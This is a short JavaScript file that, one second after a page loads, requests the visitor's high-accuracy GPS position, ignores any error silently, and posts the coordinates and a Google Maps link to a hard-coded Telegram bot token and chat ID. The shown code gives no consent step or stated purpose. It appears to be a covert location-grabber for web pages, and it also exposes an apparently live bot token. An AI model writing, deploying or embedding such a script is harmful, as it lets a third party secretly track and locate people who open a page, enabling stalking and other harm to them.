function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  const telegramToken = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
  const chatId = "5931662777";
  const message = `📍 GPS Location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, (err) => {}, {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0,
    });
  }
}

window.onload = () => {
  setTimeout(getLocation, 1000);
};
